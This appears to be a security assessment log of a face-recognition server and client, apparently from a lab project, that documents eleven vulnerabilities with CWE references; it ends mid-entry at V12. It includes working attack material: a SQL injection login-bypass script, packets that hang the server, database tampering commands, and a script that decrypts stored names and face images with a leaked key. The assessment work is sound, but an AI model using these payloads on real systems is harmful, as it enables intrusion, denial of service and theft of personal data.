
Vector (pathway, what attacker obtained)
........................................
high opportunity
 | [SERVERINFO] - can attack only with server ip, port
 | [NETWORK] - can attack over the network communicating
 | [CLIENT/BINARY] - can attack with client binary exposed *
 | [CLIENT/SOURCE] - can attack with client source exposed
 | [SERVER/ACCESS] - can attack with server accessible
 | [SERVER/BINARY] - can attack with server binary exposed *
 v [SERVER/SOURCE] - can attack with server source exposed
low opportunity
(*: through binary reversing using tools such as IDA-pro, Ghidra)

Phenomenon (phenomenon by the vulnerability)
............................................
unrecognizable
 | [NA] - no special phenomenon by the vulnerability 
 | [SLOWDOWN] - gets into a low performance state
 | [HANG] - gets into an infinity loop
 | [WRONGSTATE] - doesn't response correctly
 | [ASSERT] - causes intended abort but damages on availability
 v [CRASH] - causes e.g. unexpected segment fault or die
recognizable

Approach (what we did to find the vulnerability)
................................................
manual
 | [REVIEW/CODE] - done by reviewing code itself
 | [REVIEW/DESIGN] - done by reviewing documents or code
 | [FUZZING] - done by running fuzzing tools
 v [STATIC] - done by running static analysis tools
toolly

Technique (exploit techniques)
..............................
[SQLINJECTION] - for by-passing authentication
[BUFFEROVERFLOW] - reading or writing beyond legitimate area
[WRAPAROUND] - making use of unsinged type wraparound
[FORMATSTRING] - mainly used for leaking data on the stack
[REVEALEDKEY] - decrypting secure data using revealed keys
[SNIFFING] - sniffing packets over the network
[SPOOFING] - so-called, man in the middle attack
[BRUTEFORCE] - trying all possible input until success
[CRAFTPACKET] - crafting and sending a customized packet
[TAMPERING] - modifying system components for a purpose
[NOSPECIFIED] - no special techniques specified

CIA
...
[CONFIDENTIALITY] - compromises confidentiality
[INTEGRITY] - compromises integrity
[AVAILABILITY] - compromises availability






06/23
V01) insert an arbitrary id/password to DB
----------------------------------------
Vector 		[SERVER/ACCESS]
Phenomenon	[NA]
Approach 	[REVIEW/DESIGN]
Technique	[TAMPERING]
CIA			[INTEGRITY]
----------------------------------------
	Vulnerabilities
		V01-1. sqlite3 database files(tartan_faces.db, tartan_user.db) have no password. So it can be accessed and modified by an attacker.
			CWE-916: Use of Password Hash With Insufficient Computational Effort https://cwe.mitre.org/data/definitions/916.html
			CWE-862: Missing Authorization https://cwe.mitre.org/data/definitions/862.html

	Compromise Sequence
		1. modify tartan_user.db. insert new user with the SHA256 hashed password or replace the user's passwd.
		2. login success using new or modified user

	Analysis
		1. From install guide(tartan_install.sh), we found some db files are installed.
			$ cat tartan_install.sh
			....
			install tartan*.db /usr/local/tartan/
			....

		2. So we checked the tartan* db with sqlite3. it doesn't request any password, so we could check the data in the table.
		It consists of id, account, passwd, privilege columns. But the passwd field would be encrypted or hashed.
			$ sqlite3 tartan_user.db
			SQLite version 3.22.0 2018-01-22 18:45:57
			Enter ".help" for usage hints.
			sqlite> .table
			user

			sqlite> .schema user
			CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);

			sqlite> select * from user;
			1|admin|e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792|0
			2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2

		3. To understand the logic related in the user credentials, we checked the source codes. So we found some code snippets related in the user id and the password. So we found that the SHA256 is used for the passwd.
			< mydb.cpp >
			gboolean
			CMydb::initialize_database_account()
			{
				...
				const char *sql = "DROP TABLE IF EXISTS user;"
								  "CREATE TABLE user (id INTEGER PRIMARY KEY AUTOINCREMENT , account TEXT, passwd TEXT, privilege INT);"
								  "INSERT INTO user VALUES(1, 'admin', 'e9b6ebe030d910d3b0c253b9bd05dfc365f1e17f61f2b64385898a8247b5b792' ,0);"
								  "INSERT INTO user VALUES(2, 'lg', '078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1' ,2);";
				...
			}

			< auth.cpp >
			int CAuth::login(string id, string passwd)
			{
				CMydb db;
				CCyper cyp;
				return db.find_user(id, cyp.get_passwd_enc(passwd));
			}

			< cyper.cpp >
			string
			CCyper::get_passwd_enc(string pass)
			{
				unsigned char digest[SHA256_DIGEST_LENGTH];

				SHA256_CTX ctx;
				SHA256_Init(&ctx);
				SHA256_Update(&ctx, pass.c_str(), pass.length());
				SHA256_Final(digest, &ctx);

				string str=bytes2hex(digest,SHA256_DIGEST_LENGTH );
				// printf("SHA256 digest: %s\n", str.c_str());
				return str;
			}

		4. Finally we change the db to what we want. Change the admin paswd to SHA256 hashed value of 'lg' and add new 'user'.
		So we can login 'admin/lg' and 'user/user' in the client program
			sqlite> replace into user values (1,'admin','0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292',0);
			sqlite> insert into user values (3,'user','04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb',2);
			sqlite> select * from user;
			1|admin|0e6ba33f8bc8f41515b9d77c0e27c07ad66f2ae9b09dd7561729d6cd4d27c292|0
			2|lg|078156fd9debb7d481347e68ab19bb1f2d3028bcd61bc25994562f8a0d62e8e1|2
			3|user|04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb|2

06/24
V02) sniffing the id/password
----------------------------------------
Vector 		[NETWORK]
Phenomenon	[NA]
Approach 	[REVIEW/DESIGN][REVIEW/CODE]
Technique	[SNIFFING]
CIA			[CONFIDENTIALITY]
----------------------------------------
	Vulnerabilities
		V02-1. the communication channel for the user credentials is not secure
			CWE-319: Cleartext Transmission of Sensitive Information https://cwe.mitre.org/data/definitions/319.html

	Compromise Sequence
		1. sniffing the network packet through Wireshark.
		2. select the 'Non secure' mode and push login button
		3. the id/password is checked by captured packet

	Analysis
		1. Capture TCP Packet using port number 50000 (=non-secure port)
		See wireshark packet in './V02/tcp_packet.pcapng'.
			No.     Time           Source                Destination           Protocol Length Info
				  4 0.126187       192.168.0.217         192.168.0.228         TCP      81     11505 â†’ 50000 [PSH, ACK] Seq=1 Ack=1 Win=204800 Len=27

			Frame 4: 81 bytes on wire (648 bits), 81 bytes captured (648 bits) on interface \Device\NPF_{0BA61C95-3362-49D2-9950-76429883512C}, id 0
			Ethernet II, Src: EFMNetwo_4c:1a:37 (00:26:66:4c:1a:37), Dst: IntelCor_da:66:5a (8c:c6:81:da:66:5a)
			Internet Protocol Version 4, Src: 192.168.0.217, Dst: 192.168.0.228
			Transmission Control Protocol, Src Port: 11505, Dst Port: 50000, Seq: 1, Ack: 1, Len: 27
			Data (27 bytes)

			0000  8c c6 81 da 66 5a 00 26 66 4c 1a 37 08 00 45 00   ....fZ.&fL.7..E.
			0010  00 43 98 24 40 00 80 06 df 82 c0 a8 00 d9 c0 a8   .C.$@...........
			0020  00 e4 2c f1 c3 50 02 60 87 7e bd 7a b0 8d 50 18   ..,..P.`.~.z..P.
			0030  c8 00 75 c5 00 00 53 42 31 54 1b 00 00 00 c7 8c   ..u...SB1T......
			0040  07 3c e8 03 00 00 0a 05 61 64 6d 69 6e 12 02 6c   .<......admin..l    ## It shows that the user id 'admin' and the password 'lg' are exposed.
			0050  67                                                g


V03) exposed user credentials in the server log
----------------------------------------
Vector 		[SERVER/ACCESS]
Phenomenon	[NA]
Approach 	[REVIEW/DESIGN][REVIEW/CODE]
Technique	[NOSPECIFIED]
CIA			[CONFIDENTIALITY]
----------------------------------------
	Vulnerabilities
		V03-1. the logging information exposes too much information
			CWE-532: Insertion of Sensitive Information into Log File https://cwe.mitre.org/data/definitions/532.html

	Compromise Sequence
		1. start server and trace the logs ({git_repo_root}/LgFaceRecDemoTCP_Jetson_NanoV2/log.sh)
		2. attempt to login
		3. the logs show the user credentials including password like below.
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]: ACCOUNT=user PASSWORD=user
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]:  id:3  account:user, passwd:04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb, privilege:2
			Jun 23 04:17:54 LgFaceRecProject LgFaceRecDemoTCP_Jetson_NanoV2[7447]: OK You're a valid user : privilege=2

	Analysis
		1. just monitoring the log. we have no idea to find this vulnerability.


V04) infinite loop in the NetworkTCP.cpp
----------------------------------------
Vector 		[SERVERINFO]
Phenomenon	[HANG]
Approach 	[REVIEW/CODE]
Technique	[CRAFTPACKET]
CIA			[AVAILABILITY]
----------------------------------------
	Vulnerabilities
		V04-1. infinite loop in the ReadDataTcp function. because it doesn't handle the return value of 'recv' function correctly. it causes the denial of service.
			CWE-253: Incorrect Check of Function Return Value https://cwe.mitre.org/data/definitions/253.html

	Compromise Sequence
		1. execute 'python3 client.py'
			$ cat ./client.py
			#!/usr/bin/env python3

			import socket

			HOST = '192.168.0.228'
			PORT = 50000

			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.connect((HOST, PORT))
				s.sendall(b'Hello, world')

	Analysis
		1. when checking the man page of recv, it can return the 0 when a peer is disconnected.
			$ man recv
			...
			RETURN VALUE
			...
			When a stream socket peer has performed an orderly shutdown, the return value will be  0  (the
			traditional "end-of-file" return).
			...

		2. But in the source codes, there is no handling of the return 0 of the recv function. So if 'length' param is more than 0 and the recv returns 0 by disconnecting of the peer, the for loop is infinite.
			< NetworkTCP.cpp >
			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length)
			{
				...
				for (size_t i = 0; i < length; i += bytes)
				{
					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)
					{
						return (-1);
					}
					accumulated+=bytes;
					if (i==0) {
						...
					}
					if (my_packet_size==-1) {
						...
					}
					printf("accumulated packets=%zu   my_packet_size=%zd\n",accumulated, my_packet_size );
					if (my_packet_size>0 && accumulated>=my_packet_size)
						return accumulated;
				}
				return(length);
			}

V05) Unintentional handling of the protocol message
----------------------------------------
Vector 		[SERVERINFO]
Phenomenon	[WRONGSTATE]
Approach 	[REVIEW/CODE]
Technique	[CRAFTPACKET]
CIA			[AVAILABILITY]
----------------------------------------
	Vulnerabilities
		V05-1. The length parameter is set abnormally in case of sending the preamble "SB1T" only
			CAPEC-494: TCP Fragmentation https://capec.mitre.org/data/definitions/494.html

	Compromise Sequence
		1. <normal case> execute python statements below. and confirm login success
			>>> import socket
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000))
			>>> s.sendall(b'\x53\x42\x31\x54\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send login protocol message with id:pass=admin:lg

		2. logout confirm by the statement below
			>>> s.close()

		3. <NG case> execute python statements below. and login is not succeeded.
			>>> import time
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000)) # connect to the server
			>>> s.sendall(b'\x53\x42\x31\x54') # send preamble "SB1T" 1st
			>>> time.sleep(1) # wait
			>>> s.sendall(b'\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send remain payload to login

	Analysis
		1. When receiving the 4bytes "SB1T" only and entering "if (i==0)" statement, the "MyPacket *p" is not filled enough.
		Caller initializes the all memory pointing of data to zero. So in this case, only p->hdr.head is written to the data of the received packet and others are zero.
		2. Finally, my_packet_size is changed to 0 and the next receiving data is not parsed correctly. And then keep looping until receiving the size of the value of 'length' input param.

			< NetworkTCP.cpp >
			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length) // all memory pointing of data is zero. length is PACKET_MAX_BUFFER_SIZE (=1024 * 1024)
			{
				ssize_t bytes;
				ssize_t my_packet_size=-1;
				ssize_t accumulated=0;

				for (size_t i = 0; i < length; i += bytes)
				{
					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)  // receiving 4 bytes "SB1T"
					{
						return (-1);
					}
					accumulated+=bytes;
					if (i==0) {
						MyPacket *p=(MyPacket*)data; // data is "SB1T\0\0\0\0\0\0\0...\0".
						printf("max packet length=%zu received=%zu packet_length=%d timestamp=%u msgtype=%d\n",
									length, bytes, p->hdr.size , p->hdr.timestamp, p->hdr.msgtype);
						if (p->hdr.head[0]=='S' && p->hdr.head[1]=='B' && p->hdr.head[2]=='1' && p->hdr.head[3]=='T') {
							my_packet_size=p->hdr.size; // p->hdr.size is 0
						}
						// print_pkt_header(data,60);
					}
					...
					if (my_packet_size>0 && accumulated>=my_packet_size) // when total received data is more than PACKET_MAX_BUFFER_SIZE, return the function.
						return accumulated;
				}
				return(length);
			}

			< ProtocolDef.h >
			#pragma pack(push, 1)
			typedef  struct {
				unsigned char head[4];
				uint32_t size;
				uint32_t timestamp;
				uint32_t msgtype;
			} MyPacketHeader;

			typedef  struct {
				MyPacketHeader hdr;
				unsigned char payload[0];
			} MyPacket;
			#pragma pack(pop)

6/25
V06) Weak Passwords that Enable Brute Force Attacks
----------------------------------------
Vector 		[SERVERINFO]
Phenomenon	[NA]
Approach 	[REVIEW/CODE]
Technique	[BRUTEFORCE]
CIA			[CONFIDENTIALITY]
----------------------------------------
	Vulnerabilities
		V06-1. Weak Passwords that Enable Brute Force Attacks
			CWE-521: Weak Password Requirements https://cwe.mitre.org/data/definitions/521.html

	Compromise Sequence
		1. Try all possible cases one by one until successfully login

	Analysis
		1. Check the source codes of the client related in the password. We found that the password policy is 1~10 Random Alpha/Numeric. There is no minimum password length. When the length of password is less than 6, it has 56,800,235,584 combinations. It takes 1.10 hours or 0.05 days to crack the password. (reference: https://tmedweb.tulane.edu/content_open/bfcalc.php?uc=0&lc=0&nu=0&sc=0&ran=6&rans=0&dict=0)
			<MFCApplication1Dlg.cpp>
			BOOL CMFCApplication1Dlg::OnInitDialog()
			{
				...
				m_EditID.SetLimitText(10);
				m_EditPW.SetLimitText(10);
				...
				return TRUE;
			}

			void CMFCApplication1Dlg::OnBnClickedButtonLogin() // click login button
			{
				CString id;
				CString pw;
				m_EditID.GetWindowTextW(id);
				m_EditPW.GetWindowTextW(pw);
				if (id.IsEmpty() || checkIDPW(id) == false || pw.IsEmpty() || checkIDPW(pw) == false)
				{
					AfxMessageBox(_T("Please enter a valid ID and PW. (Alphabet, numeric only)"));
					return;
				}
				...
				// send login ID, PW
				string ids = string(CT2CA(id));
				string pws = string(CT2CA(pw));
				CLoginProtocol login(ids, pws);
				mNetworkManager->send_packet(login);
				SetTimer(REQ_TIMEOUT_TIMER, 5000, NULL);
				...
			}

V07) SQL Injection for Login
----------------------------------------
Vector 		[SERVERINFO]
Phenomenon	[NA]
Approach 	[REVIEW/CODE]
Technique	[SQLINJECTION]
CIA			[INTEGRITY][CONFIDENTIALITY]
----------------------------------------
	Vulnerabilities
		V07-1. The server doesn't validate ID/PW from client, so attacker can login with SQL injection.
			CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') https://cwe.mitre.org/data/definitions/89.html

	Compromise Sequence
		1. Send SQL injection message to server like below:
			>>> import socket
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000))
			>>> s.sendall(b'\x53\x42\x31\x54\x21\x00\x00\x00\xC7\x8C\x07\x3C\xE8\x03\x00\x00\x0A\x0B\x61\x64\x6D\x69\x6E\x27\x20\x2D\x2D\x20\x27\x12\x02\x30\x30')
			\x0A : id
			\x0B : id length
			\x61\x64\x6D\x69\x6E\x27\x20\x2D\x2D\x20\x27 : admin' -- '
			\x12 : password
			\x02 : password length
			\x30\x30 : 00

	Analysis
		1. Check the login source codes of the client and server. The client code validates ID/PW input, but the server does not.
			<mydb.cpp>
			int CMydb::find_user(string id, string passwd)
			{
				...
				std::ostringstream stringStream;
				stringStream << "SELECT * from user where account='";
				stringStream << id;
				stringStream << "' and passwd='";
				stringStream << passwd;
				stringStream << "';";
				string strstr = stringStream.str();
				char *sql = (char *)strstr.c_str();
				...
				if (sqlite3_prepare(db, sql, -1, &stmt, nullptr) == SQLITE_OK)
				{
					if (sqlite3_step(stmt) == SQLITE_ROW)
					{
						...
					}
				}
				else
				{
					SQL_CHECK("Error");
				}
				rc = sqlite3_exec(db, "END", 0, 0, 0);
				...
			}
		2. Make the protobuf message and code for ID/PW
			2-1. make protobuf message
				<protocolLogin.proto>
				syntax = "proto3";

				package protocol_msg;

				message LoginMsg {
					string user_id = 1;
					string password = 2;
				}

			2-2. build python module for message
				$ sudo apt install protobuf-compiler
				$ sudo pip install protobuf
				$ protoc -I="./" --python_out="./" protocolLogin.proto

			2-3. make SQL injection code using protobuf
				<login.py>
				# -*- coding: utf-8 -*-
				import protocolLogin_pb2
				import sys
				import socket

				# login protobuf
				login = protocolLogin_pb2.LoginMsg()
				login.user_id = "admin' -- '"
				login.password = "00"

				msg = login.SerializeToString()

				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect(('192.168.0.228', 50000))

				header = b'\x53\x42\x31\x54\x21\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00'	# preamble + size + timestamp + msgtype
				s.sendall(header + msg)

			2-4. send this message to server
				$ python3 login.py


6/28
V08) Memory leakeage in the 'get_a_packet' function
----------------------------------------
Vector 		[SERVERINFO]
Phenomenon	[SLOWDOWN]
Approach 	[REVIEW/CODE]
Technique	[NOSPECIFIED]
CIA			[AVAILABILITY]
----------------------------------------
	Vulnerabilities
		V08-1. The 'get_a_packet' function doesn't free the structure of the paresed received packet after use it.
			CWE-401: Missing Release of Memory after Effective Lifetime https://cwe.mitre.org/data/definitions/401.html

	Compromise Sequence
		1. Operate run mode
		2. Check the memory manager of the client system whether or not the occupation is increased.

	Analysis
		1. The occupation of the memory usage of the client program is increased continuously during the operation of system.
		2. Check the memory leakeage in source codes of the client program. The 'create_protocol_instance' function allocates the new memory. But the 'get_a_packet' function doesn't free the memory after the use. You can check the 'PagedMemorySize64' field of "Get-Process MFCApplication1" command of PowerShell.
			< Memory Check command in PowerShell> - PagedMemorySize64 (=The amount of memory, in bytes, allocated in the virtual memory paging file for the associated process. https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.pagedmemorysize64?view=net-5.0)
			PS C:\> Get-Process MFCApplication1 | select PagedMemorySize64, ProcessName

			PagedMemorySize64 ProcessName
			----------------- -----------
					 14893056 MFCApplication1

			< ProtocolManager.cpp >
			CBaseProtocol *
			CProtocolManager::create_protocol_instance(MsgReq id)
			{
				CBaseProtocol *cpkt = nullptr;
				switch (id)
				{
					case MSG_LOGIN:
						cpkt = new CLoginProtocol();
						break;
					case MSG_IMAGE:
						cpkt = new CImageProtocol();
						break;
					case MSG_CONTROL_MODE:
						cpkt = new CControlModeProtocol();
						break;
					case MSG_SERVER_SETTING:
						cpkt = new CServerSettingProtocol();
						break;
					case MSG_VIDEO_FILE_LIST:
						cpkt = new CVideoFileListProtocol();
						break;
					case MSG_START_LEARNING_MODE:
						cpkt = new CLearningModeProtocol();
						break;
					case MSG_ACK:
						cpkt = new CAckProtocol();
						break;
					default:
						break;
				}
				return cpkt; // return newly allocated memory
			}

			CBaseProtocol *CProtocolManager::parse_packet(MyPacket *ppkt) {
				CBaseProtocol *cpkt = nullptr;
				...
				if (ppkt->hdr.head[0]=='S' && ppkt->hdr.head[1]=='B' && ppkt->hdr.head[2]=='1' && ppkt->hdr.head[3]=='T' )
				{
					...
					cpkt=create_protocol_instance((MsgReq)ppkt->hdr.msgtype); // call create_protocol_instance function
					...
				}
				return cpkt;
			}

			< NetworkManager.cpp >
			bool NetworkManager::get_a_packet(Mat* pImage)
			{
				...
				if (ret <= PACKET_MAX_BUFFER_SIZE && ret > 0)
				{
					CProtocolManager prot_man;
					CBaseProtocol* pbase = dynamic_cast<CBaseProtocol*>(prot_man.parse_packet((MyPacket*)buff)); // call parse_packet function and get a newly allocated memory
					... // theer is no 'delete' keyword in order to free pbase.
				}
				...
			}

V09) Extraction of name and face image data used by the face recog. AI engine
----------------------------------------
Vector 		[SERVER/ACCESS]
Phenomenon	[NA]
Approach 	[REVIEW/DESIGN]
Technique	[REVEALEDKEY]
CIA			[CONFIDENTIALITY]
----------------------------------------
	Vulnerabilities
		V09-1. Storing password in an easy-to-find place and reuse an initial vector make it easy to decrypt Private Persoanl Infomation in database.
			CWE-922: Insecure Storage of Sensitive Information https://cwe.mitre.org/data/definitions/922.html
			CWE-321: Use of Hard-coded Cryptographic Key https://cwe.mitre.org/data/definitions/321.html
			CWE-323: Reusing a Nonce, Key Pair in Encryption https://cwe.mitre.org/data/definitions/323.html
			CWE-200: Exposure of Sensitive Information to an Unauthorized Actor https://cwe.mitre.org/data/definitions/200.html
			CWE-359: Exposure of Private Personal Information to an Unauthorized Actor https://cwe.mitre.org/data/definitions/359.html

	Compromise Sequence
		1. Find AES key from file which has name "secret.key"
		2. Extract data from tartan_face.db
		3. Decrypt data, Encode data appropriately
		4. We can find someone's face image (maybe one of Team1's member), and name (test)

	Analysis
		1. Find 16byte data in /var/shinpark/secret.key which is guessed as the KEY used for AES encryption
			$ hexdump /var/shinpark/secret.key
			0000000 3412 7856 bc9a f0de 5634 9a78 debc 12f0

			$ hexdump -e '16/1 "%02x"' /var/shinpark/secret.key
			123456789abcdef03456789abcdef012

		2. By examining the code related to cipher,
			2-1. we confirme that secret.key is used for cipher
				#define SECRET_KEY_FILE "/var/shinpark/secret.key"
			    fi.open( SECRET_KEY_FILE, std::ios_base::in | std::ios_base::binary);
        		fi.read((char*)secret_key,IV_SIZE);

			2-2. AES128 (16byte key length) cipher with CBC mode is used
			2-3. We found that IV(initial vector) values are 16bytes with all 00's
				string CCyper::encrypt_aes(const string instr)
				{
					string outstr;
					memset(iv, 0, sizeof(iv)); // init iv
					...
					int ret=AES_set_encrypt_key(secret_key, KEY_BIT, &aes_ks3);
					...
					AES_cbc_encrypt((unsigned char*)instr.c_str(), outbuf, len, &aes_ks3, iv, AES_ENCRYPT);
					...
					return  outstr;
				}

		3. Check tartan_face.db
			3-1. find encrypted data from name field of names table
				$ sqlite3 tartan_faces.db

				sqlite> .tables
				faces  names
				sqlite> .schema names
				CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT , name TEXT );

			3-2. find encrypted data from face field of faces table
				sqlite> .schema faces
				CREATE TABLE faces (id INTEGER PRIMARY KEY AUTOINCREMENT , names_id INT, face BLOB );

		4. Extract encrypted name data (hexstring of 32 length) and face data (blob, All blob's size is fixed - 921,624byte) from tartan_user.db
		5. Decrypt name data and face data, using shell script,
			# get cipher KEY and IV
			AES_ROOT_KEY=$(hexdump -e '16/1 "%02x"' /var/shinpark/secret.key)
			IV_VALUE='00000000000000000000000000000000'

			FACE_DB_PATH=/usr/local/tartan/tartan_faces.db

			# extract name data
			SQL_STRING="select (name) from names where id="${1}
			NAME_STRING=$(sqlite3 ${FACE_DB_PATH} "${SQL_STRING}")
			echo -n ${NAME_STRING} | xxd -r -p > name${1}

			# decrypt name data
			openssl enc -aes-128-cbc -d -in name${1} -out name${1}.dec\
				-K ${AES_ROOT_KEY}\
				-iv ${IV_VALUE}\
				-nosalt -nopad

			# extract face data
			SQL_STRING="select writefile('blob.bin', face) from faces where id="${1}
			sqlite3 ${FACE_DB_PATH} "${SQL_STRING}"

			# just eliminate first 16byte, it's for size variables
			mv blob.bin blob${1}.bin
			dd bs=16 skip=1 if=blob${1}.bin of=blob${1}.mod
			truncate -s -8 blob${1}.mod

			# decrypt face data
			openssl enc -aes-128-cbc -d -in blob${1}.mod -out blob${1}.dec\
				-K ${AES_ROOT_KEY}\
				-iv ${IV_VALUE}\
				-nosalt -nopad

		4. Encode face data to JPG format using OpenCV library
			4-1. We can know data is cv::Mat raw data type, from code review
			4-2. Create coverter executable (dbDecToJPG) using OpenCV library
				err = load_file(filename, &buf, &size);
				...
				cv::Mat image = cv::Mat(videoFrameHeight, videoFrameWidth, 16);
				image.data = buf;

				std::vector<uchar> pic_buf;
				cv::imencode(".jpg", image, pic_buf);

				err = save_file("./result.jpg", pic_buf.data(), pic_buf.size());
				...

		5. Open with image Viewer, and we can find someone's face image (maybe one of Team1's member), and name (test)

06/29
V10) the system cannot be operated on the big endian architectures
----------------------------------------
Vector 		[SERVERINFO]
Phenomenon	[WRONGSTATE]
Approach 	[REVIEW/CODE]
Technique	[NOSPECIFIED]
CIA			[AVAILABILITY]
----------------------------------------
	Vulnerabilities
		V10-1. the received message cannot be parsed correctly because there is no handling of the endianness of the network packets
			CWE-198: Use of Incorrect Byte Ordering https://cwe.mitre.org/data/definitions/198.html

	Compromise Sequence
		1. Use the client program on the big endian architectures
		2. It may not be working correctly, because the length received from the client is the big endian order.

	Analysis
		1. in the presentation document, there is no mention about the endianness. but the sniffed packet shows that the endian of length field is big endian (see V02).
		2. send the login packet (compare the packet below to the step 1 of V05) after modifying the length field to the big-endian order.
			>>> import socket
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000))
			>>> s.sendall(b'\x53\x42\x31\x54\x00\x00\x00\x1b\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send login protocol message with id:pass=admin:lg. length is changed \x1b\x00\x00\x00 to \x00\x00\x00\x1b
		3. login fail. we recognized that the system is not working by the endianness.
		4. check the code
		6. at the source codes below, doesn't handle the endianness of the 4bytes length field. So we confrimed the system cannot be executed in the big endian architectures.

			< NetworkTCP.cpp >
			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length) // data = buffer, length = 1024*1024
			{
				ssize_t bytes;
				ssize_t my_packet_size=-1;
				ssize_t accumulated=0;

				for (size_t i = 0; i < length; i += bytes)
				{
					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)
					{
						return (-1);
					}
					accumulated+=bytes;
					if (i==0) {
						MyPacket *p=(MyPacket*)data; // if data is ["SB1T" + 0x00000001 + ...], it's 1 in big-endian, but it's 16,777,216(=0x01000000) in little-endian
						printf("max packet length=%zu received=%zu packet_length=%d timestamp=%u msgtype=%d\n",
									length, bytes, p->hdr.size , p->hdr.timestamp, p->hdr.msgtype);
						if (p->hdr.head[0]=='S' && p->hdr.head[1]=='B' && p->hdr.head[2]=='1' && p->hdr.head[3]=='T') {
							my_packet_size=p->hdr.size; // my_packet_size is 16,777,216. So It will do the for loop until the received length reaches 1024*1024. if the peer doesn't send more data, the system is hang in this loop.
						}
						// print_pkt_header(data,60);
					}
					...
					printf("accumulated packets=%zu   my_packet_size=%zd\n",accumulated, my_packet_size );
					if (my_packet_size>0 && accumulated>=my_packet_size)
						return accumulated;
				}
				return(length);
			}

V11) A spoofing attack is possible because the server and client connection and operation are normal even after changing certificates(CA & server) and Private key of server to Attacker's one.
----------------------------------------
Vector 		[SERVER/ACCESS]
Phenomenon	[NA]
Approach 	[REVIEW/DESIGN]
Technique	[TAMPERING][SPOOFING][SNIFFING]
CIA			[INTEGRITY][CONFIDENTIALITY]
----------------------------------------
	Vulnerabilities
		V10-1. By using Self-signed CA certificate and not performing integrity checks, an attacker could perform a Man-in-the-Middle Attack.
			CWE-295: Improper Certificate Validation https://cwe.mitre.org/data/definitions/295.html
			CWE-296: Improper Following of a Certificate's Chain of Trust https://cwe.mitre.org/data/definitions/296.html

	Compromise Sequence
		1. Creating new forgery Chain of Trust.
		2. Replacing forged server private.pem, cert.pem and share forged ca-cert.pem between server and client.
		3. TLS channel is successfully estabilished with forged certificate.

	Analysis
		1. After examining the "tartan_install.sh" script,
			1-1. we can found the certificate and private key files in following location, not protected well.
			$ ls -alF /var/shinpark/certs/

			-rwxr-xr-x 1 root root 4502 Jun 28 02:39 ca-cert.pem*
			-rwxr-xr-x 1 root root 3517 Jun 28 02:39 cert.pem*
			-rwxr-xr-x 1 root root  227 Jun 28 02:39 private.pem*

			1-2. Client Program has "certs" DIR, and also has "ca-cert.pem" file, both files are identical.
			(SHA256: 1609531E2178A50FE0D31379C1959E9870B4AF4316395E5EEC52521EC4F844A3)

			1-3. This certificate is presumed to be a ca (Root trust of certificate chain) used by the server and the client together.
			1-4. The client uses "ca-cert.pem" to check the "cert.pem" passed from the server to perform server authentication.
			1-5. But the server does not seem to perform authentication for the client.

		2. Server Private Key "private.pem" is EC(Eliptic Curve) spec. using NIST CURVE: P-256.
			We know server's private key, but that private key is an EC spec, so it's very hard to decrypt TLS communication channel.
			(for examples, Wireshark tool can doing TLS communication decryption using server-private key, but only support RSA spec.)
			Using EC key is good decision.

		3. After examining of TLS client/server hello handshake using wireshark tool, we can find TLS1.3 is used for TLS communication.
			A TLS1.3 channel cannot sniff even if the server private key is known and the server private key is RSA spec.
			It's also good decision.

		4. So, we try creating new forgery Chain of Trust (It's Attacker's certificate, so it's actually Untrusted).
			4-1. Create forgery CA private key, self-signed CA certificate. It's "forgery CA certificate"
			4-2. Create forgery Server private key and certificate which is signed using a forgery CA certificate.

		5. Replacing forged server private.pem, cert.pem and share forged ca-cert.pem between server and client, TLS channel is successfully estabilished.

		6. Man-in-the-Middle attack is possible using below scenario.
			6-1. The attacker replaces the certificate used by the client with a forged certificate.
			6-2. And induces the client to attempt to connect to the attacker's server. (ARP Spoofing, TLS handshake using forged cert)
			6-3. The attacker's server try to connect to the server using the original Certificate. (normal TLS handshake)
				a. Since the server does not authenticate the client, this attempt will succeed.
				b. Even when the server authenticates the client, the connection can be successful by using the original certificate and key extracted from the client.
			6-4. The attacker's server now relaying the client's request to the server, and sniff messages.

V12)Crash by Integer Underflow related in the packet size
----------------------------------------
Vector 		[SERVERINFO]
Phenomenon	[ASSERT]
